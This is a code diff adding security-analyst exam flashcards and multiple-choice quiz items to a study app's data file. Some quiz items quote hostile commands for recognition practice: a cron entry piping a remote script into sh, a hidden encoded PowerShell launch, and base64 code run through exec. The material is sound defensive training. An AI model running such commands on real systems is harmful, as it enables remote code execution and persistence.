@@ -419,3 +419,156 @@ SCENARIOS = [
 ]
 
 OBJTITLE = {"1.1": "System & Network Architecture", "1.2": "Indicators of Malicious Activity", "1.3": "Tools & Techniques", "1.4": "Threat Intelligence & Hunting", "1.5": "Efficiency & Process Improvement"}
+
+# ---------------------------------------------------------------------------
+# Added 2026-10-25 after mining all class material (13 transcripts, Day 1-6
+# decks with speaker notes, flashcards) and classifying each topic against
+# build/cysa-spine.json. Original prose.
+#
+# EXAM OBJECTIVE gaps found: 1.3 names JSON, XML, Python, PowerShell and shell
+# script among the languages an analyst reads; 1.4 names information sharing
+# organizations. Neither was drilled.
+# ---------------------------------------------------------------------------
+
+FLASHCARDS += [
+ ("1.3", "Why does an analyst need to read JSON, and what does it look like?",
+  "Most API responses, cloud audit logs and SIEM events arrive as JSON: key-value pairs in braces, lists in brackets, nested freely. Reading it means finding the fields that matter, such as source address, user, action and result, inside a deeply nested record. Tools like jq filter it from the command line."),
+ ("1.3", "Where does an analyst meet XML?",
+  "Windows event logs exported from Event Viewer, SAML authentication assertions, many older APIs and configuration files, and some threat intelligence feeds. It is tag-based: elements open and close, with attributes inside the tags. XML parsers are also an attack surface, which is where XXE comes from."),
+ ("1.3", "What is Python typically used for in security operations?",
+  "Automation: parsing logs, calling threat intelligence and SIEM APIs, enriching indicators, decoding obfuscated data. Analysts also read Python because attackers use it. Lines that decode base64 and pass the result to exec() or eval() are a classic sign of hidden code."),
+ ("1.3", "What should make you look twice when reading a shell or PowerShell script?",
+  "Downloading and executing in one step (curl or wget piped to sh; IEX with DownloadString), encoded commands (PowerShell -EncodedCommand or -enc), writes to cron, systemd, Run keys or scheduled tasks, disabled logging or history, and anything that deletes its own file. Each is a hallmark of a dropper or persistence."),
+ ("1.4", "What is an ISAC?",
+  "An Information Sharing and Analysis Center: a sector-specific body where member organizations share threat indicators, alerts and incident experience with each other. Examples include FS-ISAC for finance, Health-ISAC for healthcare and MS-ISAC for US state and local government. The value is intelligence from peers facing the same adversaries."),
+ ("1.4", "Which public bodies publish threat information an analyst should follow?",
+  "Government agencies such as CISA in the US, which publishes advisories and the Known Exploited Vulnerabilities catalog; national CERTs and CSIRTs; and the ISACs for each sector. Government and sector sources are often the first to say a vulnerability is being exploited in the wild."),
+]
+
+QUIZ += [
+ ("1.3", "A log record reads {\"src\":\"203.0.113.5\",\"user\":\"svc_backup\",\"action\":\"deny\"}. Which format is it?",
+  ["XML", "JSON", "CSV", "Syslog RFC 5424"],
+  1, "Braces around quoted key-value pairs separated by colons and commas are JSON. XML uses opening and closing tags, CSV uses delimited columns with no keys, and syslog is a header followed by free text."),
+ ("1.3", "A script contains: import base64; exec(base64.b64decode('aW1wb3J0IG9z...')). What is the concern?",
+  ["Nothing; base64 is a standard encoding", "Hidden code: the real instructions are encoded and executed at runtime", "It is a syntax error and will not run", "It only encrypts data at rest"],
+  1, "Encoding code and running it through exec() hides what the script really does from anyone skimming it and from simple signatures. Decode the string before trusting the script. Base64 is encoding, not encryption."),
+ ("1.3", "A cron entry reads: */5 * * * * curl -s http://198.51.100.7/u.sh | sh. What does it do?",
+  ["Checks a web page for updates every five minutes", "Downloads a script from a remote host and runs it every five minutes", "Uploads logs to a central server", "Runs a local shell script at startup"],
+  1, "Piping a downloaded file straight into sh means whatever the remote host serves gets executed, every five minutes, as the cron owner. It is both persistence and a channel the attacker can update at will."),
+ ("1.3", "A process launches powershell.exe -nop -w hidden -enc SQBFAFgA... What does -enc indicate?",
+  ["The script output is encrypted", "The command is passed base64-encoded, which hides it from casual inspection", "PowerShell is running in constrained language mode", "The command will only run on encrypted volumes"],
+  1, "-enc (EncodedCommand) takes a base64-encoded command. Combined with -nop (no profile) and -w hidden (hidden window), it is a very common malicious pattern. Decode it to see the real command; script block logging records it decoded."),
+ ("1.4", "A hospital wants threat intelligence from peers facing the same attackers. Which source fits best?",
+  ["A general-purpose OSINT feed", "Health-ISAC", "The vendor's antivirus signature updates", "An internal honeypot"],
+  1, "An ISAC exists to share sector-specific intelligence among members. Health-ISAC members see the campaigns aimed at healthcare first and share indicators and context that generic feeds lack."),
+]
+
+# ---------------------------------------------------------------------------
+# GENERAL KNOWLEDGE: cybersecurity material from the class that is NOT on the
+# CS0-003 objectives (checked against cysa-spine.json). Filed under the nearest
+# Domain 1 objective, badged "General knowledge" on the page, hidden by the
+# "Exam only" toggle, and scored separately from objective accuracy.
+# ---------------------------------------------------------------------------
+
+GK_FLASHCARDS = [
+ ("1.1", "What is LDAP, and which ports does it use?",
+  "The Lightweight Directory Access Protocol, used to query and modify directory services such as Active Directory and OpenLDAP. TCP 389 is cleartext (optionally upgraded with StartTLS); 636 is LDAPS over TLS. Attackers use LDAP queries to enumerate users, groups and computers after gaining a foothold."),
+ ("1.1", "How does Kerberos authentication work in Active Directory?",
+  "The Key Distribution Center on a domain controller issues a ticket-granting ticket at logon, and the client trades it for service tickets for each resource, so passwords are not sent to every server. It runs on port 88 and rejects clocks more than five minutes apart by default, which is another reason time synchronization matters."),
+ ("1.1", "What does Group Policy do, and which commands check it?",
+  "Group Policy Objects push settings (password policy, security baselines, software restrictions) to computers and users by site, domain or organizational unit. gpupdate /force pulls the latest policy now; gpresult /r shows which policies actually applied to a machine and user."),
+ ("1.1", "What is SAML, and how is trust established?",
+  "Security Assertion Markup Language: an XML format in which an identity provider sends a signed assertion about a user to a service provider, enabling web single sign-on. The service provider trusts the assertion because it is configured with the identity provider's public signing certificate. OAuth is authorization; OpenID Connect adds authentication on top of OAuth."),
+ ("1.1", "Compare DAC, MAC, RBAC and ABAC.",
+  "DAC: the owner decides who gets access (NTFS default).\nMAC: the system enforces access from labels the user cannot change (SELinux, classified systems).\nRBAC: access follows job roles.\nABAC: access follows attributes and conditions, such as department, device or time (Azure dynamic groups, Windows Dynamic Access Control claims)."),
+ ("1.1", "A user reaches a folder over the network. How do share and NTFS permissions combine?",
+  "Both apply and the more restrictive wins. Share permissions apply only to network access; locally, only NTFS applies. An explicit deny overrides an allow. This is why an investigation into file access checks both layers."),
+ ("1.1", "Linux account and permission basics an analyst should know.",
+  "chmod sets permissions (755 = rwx for owner, r-x for group and others). sudo grants elevated commands, configured in sudoers, which should be edited with visudo because it checks syntax. Password hashes live in /etc/shadow (root only); /etc/passwd is world-readable and holds no hashes."),
+ ("1.1", "EFS versus BitLocker.",
+  "EFS encrypts individual files and folders per user on NTFS. BitLocker encrypts the whole volume and normally keeps its key in the TPM so the disk will not unlock in another machine. BitLocker protects a stolen laptop; EFS protects files from other users of the same machine. Recovery keys must be escrowed, or encryption becomes data loss."),
+ ("1.1", "TPM versus HSM.",
+  "A TPM is a chip on one device that stores keys and measures the boot process, tying secrets to that machine. An HSM is a dedicated, tamper-resistant appliance or PCIe card that generates and protects keys for an organization, such as a CA's signing key. Cloud key vaults and KMS are managed HSM services."),
+ ("1.1", "CRL versus OCSP.",
+  "Both tell a client whether a certificate has been revoked. A CRL is a signed list the client downloads periodically, so it can be stale. OCSP answers a real-time query about one certificate. OCSP stapling has the server attach a fresh OCSP response during the TLS handshake."),
+ ("1.1", "What does a code-signing certificate prove, and what does it not?",
+  "It proves who published the code and that it has not changed since signing. It does not prove the code is safe: stolen and fraudulently issued signing certificates have signed real malware. A valid signature lowers suspicion; it does not end the investigation."),
+ ("1.1", "GDPR, HIPAA, CCPA and PCI DSS: what does each cover?",
+  "GDPR: personal data of people in the EU, whoever processes it; breaches reported to the authority within 72 hours.\nHIPAA: US protected health information held by covered entities and their business associates.\nCCPA (amended by CPRA): personal information of California residents.\nPCI DSS: cardholder data; a contractual industry standard, not a law."),
+ ("1.1", "PII, PHI, SPI, EHR and PHR.",
+  "PII identifies a person. PHI is health information tied to an individual. SPI is the especially sensitive subset, such as religion, political opinion, health and sexual orientation (GDPR's special categories). An EHR is the record a healthcare provider keeps; a PHR is a record the patient manages."),
+ ("1.1", "Name three data classification tools and what each does.",
+  "Amazon Macie: discovers sensitive data in S3 buckets using pattern matching and machine learning. Microsoft Purview Information Protection (formerly Azure Information Protection): applies sensitivity labels that can encrypt and restrict documents. Windows File Server Resource Manager: classifies files on a file server by rules. Classification has to come before DLP can act on it."),
+ ("1.1", "How is DHCP abused, and what defends it?",
+  "A rogue DHCP server hands out its own gateway or DNS server to intercept traffic; a starvation attack exhausts the address pool. DHCP snooping on switches allows offers only from trusted ports. DHCP logs, which map IP to MAC address to time, are also how you attribute activity to a device."),
+ ("1.1", "WPA2-Personal, WPA2/WPA3-Enterprise and WPA3-Personal.",
+  "Personal modes use one shared passphrase. Enterprise modes use 802.1X, sending each user's credentials to a RADIUS server, so access can be revoked per person. WPA3-Personal replaces the pre-shared key handshake with SAE, which resists offline dictionary attacks. WEP and TKIP are broken."),
+ ("1.1", "What does DNSSEC protect, and what does it not?",
+  "It digitally signs DNS records so a resolver can verify they are authentic and unaltered, which defeats cache poisoning. It does not encrypt queries; DNS over HTTPS and DNS over TLS do that."),
+ ("1.1", "Stateless, stateful, next-generation and web application firewalls.",
+  "Stateless: judges each packet alone against ACL rules. Stateful: tracks connections, so return traffic is allowed automatically. NGFW: adds application awareness, user identity and IPS. WAF: inspects HTTP itself to block attacks such as SQL injection and XSS."),
+ ("1.1", "IDS versus IPS, and network versus host.",
+  "An IDS detects and alerts; an IPS sits inline and can block. NIDS and NIPS watch network traffic; HIDS and HIPS watch one host's files, logs and processes. Detection is by signature (known patterns) or anomaly (deviation from a baseline)."),
+ ("1.1", "How do firewall rule order and implicit deny work?",
+  "Rules are evaluated top down and the first match wins, so a broad allow above a specific deny makes the deny useless. Traffic matching no rule is dropped by the implicit deny at the end. Windows Defender Firewall blocks unsolicited inbound traffic by default."),
+ ("1.1", "What is a bastion host (jump box)?",
+  "A single hardened, heavily logged entry point for administrators to reach systems in a private network, so management ports are never exposed directly. Azure Bastion and AWS bastion instances are cloud forms. Put MFA and session recording there."),
+ ("1.1", "CIDR basics for cloud network planning.",
+  "The prefix length says how many bits are network: /24 is 256 addresses, /16 is 65,536. Cloud VPCs and virtual networks are sized in CIDR, and overlapping ranges prevent peering or VPN connections between them, which is a common reason segmentation plans fail."),
+ ("1.1", "MBR versus GPT, and why it matters for security.",
+  "MBR allows four primary partitions and disks up to 2 TB, and its boot code is a classic bootkit target. GPT supports far more partitions and larger disks, and UEFI Secure Boot, which checks boot components' signatures, requires it."),
+ ("1.1", "What is a CMDB?",
+  "A configuration management database: the authoritative record of configuration items (servers, applications, network devices) and how they depend on each other. Vulnerability scope, incident impact and change risk all depend on it being accurate."),
+ ("1.3", "Splunk essentials.",
+  "Data lands in indexes (the default is main). Universal forwarders on hosts ship logs to the indexer. Searches use SPL. Roles control which indexes a user may search. 'splunk add monitor' tells a forwarder which files or directories to collect."),
+ ("1.3", "What is Microsoft Sentinel?",
+  "Microsoft's cloud-native SIEM and SOAR in Azure. Data connectors bring in logs, KQL queries hunt through them, analytics rules raise incidents, and playbooks built on Logic Apps automate the response."),
+ ("1.3", "Essential tcpdump options.",
+  "-i chooses the interface, -n skips name lookups, -s0 captures whole packets, -w writes a pcap for Wireshark, -A prints payloads as ASCII. Filters go last, without dashes: host 10.0.0.5 and port 22."),
+ ("1.3", "Which OSI layer does each part of a Wireshark packet belong to?",
+  "Ethernet frame: layer 2. IP header: layer 3. TCP or UDP header: layer 4. Application data such as HTTP or DNS: layer 7. Display filters such as ip.addr==10.0.0.5 and tcp.port==443 narrow a capture."),
+ ("1.2", "Why are Modbus and S7comm a monitoring priority in ICS networks?",
+  "Both industrial protocols (Modbus TCP on port 502, S7comm on 102) were designed without authentication, so any device that can reach a controller can send it commands. Write commands from an unexpected host are a high-priority alert."),
+ ("1.2", "How does a SYN flood work, and what blunts it?",
+  "The attacker sends many SYNs and never completes the handshake, filling the server's table of half-open connections so real clients cannot connect. SYN cookies let the server avoid storing state until the handshake completes."),
+ ("1.2", "What is a slow HTTP denial of service?",
+  "Opening many connections and sending headers or bodies very slowly (Slowloris; the slowhttptest tool simulates it) so the server keeps every connection open and runs out of workers, using almost no bandwidth. Defenses are request timeouts, per-client connection limits and a reverse proxy in front."),
+ ("1.4", "STIX versus TAXII.",
+  "STIX is the language: a structured format (JSON in version 2) for describing indicators, malware, threat actors and the relationships between them. TAXII is the transport: an HTTPS-based protocol for sharing STIX between organizations."),
+ ("1.4", "How do CVE and the NVD relate?",
+  "CVE assigns each publicly known vulnerability an ID (CVE-year-number) through numbering authorities overseen by MITRE. NIST's National Vulnerability Database enriches each CVE with CVSS scores, affected product identifiers (CPE) and weakness types (CWE)."),
+ ("1.4", "What is BeEF, and what does it demonstrate?",
+  "The Browser Exploitation Framework. A hook script, usually injected through an XSS flaw, gives the tester control of the victim's browser: fingerprinting, phishing prompts and pivoting. It shows why XSS is more than an alert box."),
+ ("1.4", "Kali Linux, DVWA and hping3.",
+  "Kali Linux is a penetration-testing distribution with hundreds of tools preinstalled. DVWA is a deliberately vulnerable web application for safe practice and must never face the internet. hping3 crafts custom TCP, UDP and ICMP packets for firewall testing, scanning or flooding."),
+]
+
+GK_QUIZ = [
+ ("1.1", "A folder's share permission grants Everyone Full Control, and its NTFS permission grants a user Read. What can the user do over the network?",
+  ["Full Control", "Read", "Nothing", "Modify"],
+  1, "Over the network both layers apply and the more restrictive wins, so Read. Share permissions often stay wide open and NTFS does the real work."),
+ ("1.1", "How does a SAML service provider know an assertion really came from the identity provider?",
+  ["The assertion travels over HTTPS", "It verifies the assertion's signature with the identity provider's public certificate", "The user's password is included in the assertion", "The identity provider's IP address is allowlisted"],
+  1, "Trust is cryptographic: the identity provider signs each assertion, and the service provider validates it with the certificate it was configured with. HTTPS protects the transport but does not prove who wrote the assertion."),
+ ("1.1", "Which Wi-Fi configuration lets you revoke one employee's wireless access without changing anyone else's?",
+  ["WPA2-Personal", "WPA3-Personal", "WPA2/WPA3-Enterprise with 802.1X and RADIUS", "Hidden SSID"],
+  2, "Enterprise mode authenticates each user individually against a RADIUS server, so disabling one account removes one person. Personal modes share a passphrase, and a hidden SSID is not access control."),
+ ("1.1", "What does DNSSEC provide?",
+  ["Encryption of DNS queries", "Authenticity and integrity of DNS records", "Anonymity for DNS clients", "Faster DNS resolution"],
+  1, "DNSSEC signs records so resolvers can detect forgery and tampering. It does not hide queries; encryption is DNS over HTTPS or TLS."),
+ ("1.1", "A browser must check a certificate's revocation status in real time. Which mechanism fits?",
+  ["CRL", "OCSP", "CSR", "PFX"],
+  1, "OCSP answers a live query for one certificate. A CRL is a list downloaded periodically, a CSR is a certificate request, and PFX is a file format for a certificate with its private key."),
+ ("1.1", "An analyst must find which policies actually applied to a workstation. Which command?",
+  ["gpupdate /force", "gpresult /r", "netstat -ano", "ipconfig /all"],
+  1, "gpresult reports the resulting policy for the computer and user. gpupdate only refreshes policy; it does not report it."),
+ ("1.3", "In Splunk, what ships logs from an endpoint to the indexer?",
+  ["A search head", "A universal forwarder", "An index", "A dashboard"],
+  1, "The universal forwarder is the lightweight agent on the host that collects and sends data. Indexes store data, search heads run searches, and dashboards display results."),
+ ("1.2", "Why is a Modbus write command from an engineering laptop nobody recognizes so serious?",
+  ["Modbus encrypts traffic, so it cannot be inspected", "Modbus has no authentication, so any reachable device can change the process", "Modbus only runs on serial lines", "Write commands are always malicious"],
+  1, "Modbus trusts whoever can reach it. An unknown host issuing writes could be changing a physical process, so it is investigated as a possible attack even before intent is known."),
+ ("1.4", "What is the difference between STIX and TAXII?",
+  ["STIX is a protocol; TAXII is a format", "STIX is a format for describing threat intelligence; TAXII is a protocol for exchanging it", "Both are threat intelligence platforms", "STIX is for vulnerabilities; TAXII is for malware"],
+  1, "STIX describes the intelligence; TAXII carries it. They are designed to be used together."),
+]
